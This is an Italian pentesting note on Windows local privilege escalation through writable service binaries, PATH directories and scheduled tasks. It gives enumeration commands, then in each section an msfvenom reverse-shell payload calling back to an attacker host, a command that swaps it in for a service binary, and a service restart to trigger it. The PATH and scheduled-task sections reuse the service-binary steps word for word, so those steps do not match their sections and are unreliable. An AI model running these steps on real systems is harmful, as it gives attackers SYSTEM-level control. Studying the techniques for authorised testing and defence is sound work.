#Privesc_Windows 

---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Service Binary Writable]]
- [[#Eseguibili nel PATH]]
- [[#Scheduled Tasks]]
---
---
---
### Introduzione
Le **Insecure Permissions on Executables** rappresentano una vulnerabilità di tipo Local Privilege Escalation (LPE) quando file eseguibili o le risorse che li riferiscono **(es. binPath dei servizi, task schedulati, entry PATH)** sono scrivibili da un utente non privilegiato. Un attaccante con accesso a un account non-privilegiato può sostituire o modificare un eseguibile legittimo con uno malevolo (o inserire una DLL/programma nella posizione che verrà eseguita), ottenendo così esecuzione con privilegi più elevati (spesso SYSTEM).

---
### Enumerazione
Per identificare eseguibili/risorse scrivibili che verranno eseguiti da contesti più privilegiati.
Comandi utili (PowerShell / CMD):

```
whoami whoami /groups
icacls C:\Program\SomeApp\some.exe icacls "C:\Program Files" /findsid S-1-1-0 /T
```

Con AccessChk (Sysinternals):

```
accesschk.exe -uwcqv "Authenticated Users" C:\Path\to\*    # mostra file/directory scrivibili accesschk.exe -uwcqv * | findstr /i "WRITE"                # ricerca globale
```

Enumerare servizi e verificare binPath (per trovare binari che possono essere scritti):

```
sc query type= service state= all sc qc <ServiceName>         # estrae BINARY_PATH_NAME
```

Enumerare Scheduled Tasks:

```
schtasks /query /fo LIST /v Get-ScheduledTask
```

Per automatizzare il processo possiamo usare [winpeas.exe](https://github.com/peass-ng/PEASS-ng/releases/tag/20250904-27f4363e) e  [PowerUp.ps1](https://github.com/HarmJ0y/PowerUp).

---
### Service Binary Writable
Se il file indicato in `BINARY_PATH_NAME` è scrivibile dall'utente, basta sostituirlo con un eseguibile che esegua una shell o modifichi token per ottenere SYSTEM.

 Elenchiamo tutti i servizi sulla macchina target:
 
```
sc query type= service state= all
```

Per ogni servizio si estrare il `BINARY_PATH_NAME`:

```
sc qc <ServiceName>` → copia il percorso dell’eseguibile.
```

Verifica i permessi del file:

```
icacls "C:\path\to\binary.exe" 
accesschk.exe -uwcqv "Users" "C:\path\to\binary.exe"
```
 
Se compaiono **Users/Authenticated Users/Everyone** con `Write` o `Modify`, allora creiamo un file malevolo con `msfvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f exe-service -o reverse.exe
```

Sostituiamo al posto dell'originale:

```
Copy-Item -Path "C:\Temp\reverse.exe" -Destination "C:\Program Files\File Permissions Service\filepermservice.exe" -Force
```

Riavviamo il servizio per attivare al *reverse shell:*

```
sc stop filepermsvc
sc start filepermsvc
```

---
### Eseguibili nel PATH
Se la variabile `%PATH%` utilizzata da processi privilegiati contiene directory **scrivibili da utenti non privilegiati** (es. cartelle temporanee, `C:\Users\Public\Tools`), è possibile inserire un eseguibile con lo stesso nome di un comando invocato senza path assoluto, ottenendo così esecuzione con privilegi elevati.

Elenchiamo il contenuto della variabile PATH:

```
$env:Path.Split(';') | ForEach-Object { $_ }
```

Per ogni directory nel PATH verifichiamo i permessi NTFS:

```
(Get-Acl $_).Access | Where-Object { $_.IdentityReference -match 'Users|Authenticated Users|Everyone' -and $_.FileSystemRights -match 'Write' }
```

Se compaiono **Users/Authenticated Users/Everyone** con `Write` o `Modify`, allora creiamo un file malevolo con `msfvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f exe-service -o reverse.exe
```

Sostituiamo al posto dell'originale:

```
Copy-Item -Path "C:\Temp\reverse.exe" -Destination "C:\Program Files\File Permissions Service\filepermservice.exe" -Force
```

Riavviamo il servizio per attivare al *reverse shell:*

```
sc stop filepermsvc
sc start filepermsvc
```

---
### Scheduled Tasks
I **task schedulati** possono essere configurati per eseguire programmi con privilegi **SYSTEM** o di altri account. Se il binario che il task esegue è scrivibile da un utente non privilegiato, si apre un rischio di esecuzione arbitraria.

Elenca tutti i task schedulati:

```
schtasks /query /v /fo LIST
```

Per ogni task, estrai il programma/script nella sezione “Task To Run” / “Action” e verifica i permessi NTFS:

```
icacls "C:\path\to\task_target.exe" accesschk.exe -uwcqv "Users" "C:\path\to\task_target.exe"
```

Se compaiono **Users/Authenticated Users/Everyone** con `Write` o `Modify`, allora creiamo un file malevolo con `msfvenom`:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f exe-service -o reverse.exe
```

Sostituiamo al posto dell'originale:

```
Copy-Item -Path "C:\Temp\reverse.exe" -Destination "C:\Program Files\File Permissions Service\filepermservice.exe" -Force
```

Riavviamo il servizio per attivare al *reverse shell:*

```
sc stop filepermsvc
sc start filepermsvc
```
